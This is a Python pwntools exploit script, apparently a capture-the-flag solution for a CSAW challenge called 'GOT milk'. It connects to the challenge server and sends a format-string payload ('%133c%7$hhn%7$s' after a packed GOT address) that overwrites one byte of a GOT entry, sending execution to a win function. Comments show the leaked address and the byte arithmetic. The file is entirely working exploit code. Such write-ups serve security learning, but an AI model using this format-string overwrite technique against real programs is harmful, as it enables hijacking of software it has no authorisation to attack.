from pwn import *

context.arch = 'i386'

con = remote('pwn.chal.csaw.io', 1004)

con.recvregex('GOT milk\? ')

con.sendline(pack(0x804a010) + '%133c%7$hhn%7$s')

print con.recvline().strip()[13:].encode('hex')
print con.recvall()

# print '[+] lose GOT addr = 0x%08x' % unpack(msg[17:21])
# > [+] lose GOT addr = 0xf7f881f8
# lose_addr = 000011f8
# win_addr  = 00001189
# f8 => 89
